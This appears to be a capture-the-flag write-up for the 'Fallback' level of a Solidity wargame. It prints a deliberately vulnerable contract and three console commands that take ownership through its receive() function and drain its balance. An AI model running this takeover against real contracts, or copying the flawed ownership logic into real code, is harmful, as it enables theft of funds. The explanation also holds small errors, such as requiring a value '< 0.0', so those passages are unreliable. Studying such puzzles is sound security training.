## Fallback memes

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

</p>
</details>

### Solution

In a nutshell, solidity will always require some sort of fallback method to be able to process any non-standard transaction sent to the contract. 
This includes any sort of transaction with no data, no matching parameters and so and forth. As of current state, the default fallback method is
the last one in the contract. It has to be external and payable.

In our meme of a contract, we're provided with the following fallback method:


```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

Little needs to be said, we need to contribute once and then send a bogus transaction with < 0.0 value. However lets have a peek at the contribute
function:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
}
```
Wow. So hard. We need to send sub 0.001. Wowzer. Here are the commands:

```javascript
contract.contribute({to: instance, from: player, value: toWei("0.0005", "ether")})
sendTransaction({from: player, to: contract, value: toWei("0.0005", "ether")})
contract.withdraw()
```

Tada... how anticlimactic.
